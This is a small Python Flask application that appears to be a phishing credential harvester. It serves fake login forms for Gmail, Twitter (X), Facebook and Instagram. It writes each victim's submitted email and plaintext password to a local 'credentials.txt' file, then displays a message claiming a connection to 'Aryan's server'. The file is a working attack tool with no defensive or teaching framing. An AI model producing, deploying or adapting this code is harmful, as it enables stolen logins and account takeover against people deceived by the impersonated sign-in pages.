import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)
logging.info("This is a log message.")


from flask import Flask, request, render_template

app = Flask(__name__)

LOG_FILE = 'credentials.txt'

# Ensure the log file exists
with open(LOG_FILE, 'a') as file:
    pass

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/connect/<platform>', methods=['GET', 'POST'])
def connect(platform):
    platform_names = {
        "gmail": "Gmail",
        "twitter": "Twitter (X)",
        "facebook": "Facebook",
        "instagram": "Instagram"
    }
    platform_name = platform_names.get(platform, "Unknown Platform")

    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        
        # Log credentials to the file
        with open(LOG_FILE, 'a') as file:
            file.write(f"{platform_name} Login - Email: {email}, Password: {password}\n")
        
        return f"Connection established to Aryan's server via {platform_name}"
    
    return render_template('platform_form.html', platform_name=platform_name, platform_action=platform)

if __name__ == '__main__':
    app.run(debug=True)
